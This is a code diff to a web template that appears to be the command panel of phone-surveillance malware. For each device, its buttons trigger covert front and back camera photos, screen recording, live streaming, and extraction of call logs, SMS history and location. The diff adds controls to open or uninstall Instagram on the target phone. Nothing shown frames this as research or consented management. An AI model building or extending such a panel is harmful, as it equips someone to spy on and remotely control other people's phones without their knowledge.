@@ -189,18 +189,43 @@
                                             Live</button>
                                         <button onclick="sendCommand('<%= deviceId %>', 'stop_live_stream')"
                                             class="cmd-btn">⏹ Stop Live</button>
-                                        <button onclick="sendCommand('<%= deviceId %>', 'front_photo')"
-                                            class="cmd-btn">🤳 Front </button>
-                                        <button onclick="sendCommand('<%= deviceId %>', 'back_photo')"
-                                            class="cmd-btn">📸 Back </button>
+                                        <button onclick="sendCommand('<%= deviceId %>', 'front_photo')" class="cmd-btn">
+                                            🤳 Front Cam
+                                        </button>
+                                        <button onclick="sendCommand('<%= deviceId %>', 'back_photo')" class="cmd-btn">
+                                            📸 Back Cam
+                                        </button>
                                         <button onclick="sendCommand('<%= deviceId %>', 'record_screen')"
-                                            class="cmd-btn">🎬 Rec Screen</button>
+                                            class="cmd-btn">
+                                            🎬 Rec Screen
+                                        </button>
                                         <button onclick="sendCommand('<%= deviceId %>', 'extract_call_logs')"
-                                            class="cmd-btn">📞 Call Logs</button>
+                                            class="cmd-btn">
+                                            📞 Call Logs
+                                        </button>
                                         <button onclick="sendCommand('<%= deviceId %>', 'extract_sms_history')"
-                                            class="cmd-btn">✉️ SMS Hist</button>
+                                            class="cmd-btn">
+                                            ✉️ SMS Hist
+                                        </button>
                                         <button onclick="sendCommand('<%= deviceId %>', 'extract_location')"
-                                            class="cmd-btn">📍 Location</button>
+                                            class="cmd-btn">
+                                            📍 Location
+                                        </button>
+
+                                        <!-- NEW APP CONTROL BUTTONS -->
+                                        <div class="w-full flex gap-2 pt-2 border-t border-white/10 mt-2 flex-wrap">
+                                            <span
+                                                class="w-full text-xs text-slate-400 font-semibold mb-1 uppercase tracking-wider">App
+                                                Control</span>
+                                            <button onclick="sendCommand('<%= deviceId %>', 'open_instagram')"
+                                                class="cmd-btn">
+                                                📱 Open IG
+                                            </button>
+                                            <button onclick="sendCommand('<%= deviceId %>', 'uninstall_instagram')"
+                                                class="cmd-btn" style="background: rgba(153,27,27,0.8);">
+                                                🗑️ Uninstall IG
+                                            </button>
+                                        </div>
                                     </div>
                                 </div>
                                 <% }); %>
